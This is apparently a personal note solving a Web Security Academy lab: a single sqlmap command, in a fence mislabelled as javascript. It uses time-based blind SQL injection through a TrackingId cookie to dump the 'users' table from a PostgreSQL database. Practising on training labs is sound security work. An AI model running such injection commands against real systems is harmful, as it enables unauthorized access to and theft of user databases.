sqlmap payload:

```javascript
sqlmap -u"https://ac581f491ff33d44807531df001d00fe.web-security-academy.net" 
--cookie="TrackingId=hjrXeFvnCSwTXMSZ; session=hhrXoZA0Nd5vDcIIsz8AjFG3o640sOdu" 
--level 2 --skip="session" --technique T --force-ssl --dbms "PostgreSQL" 
--proxy="http://127.0.0.1:10809" 
--dump -T"users" -D"public"
```

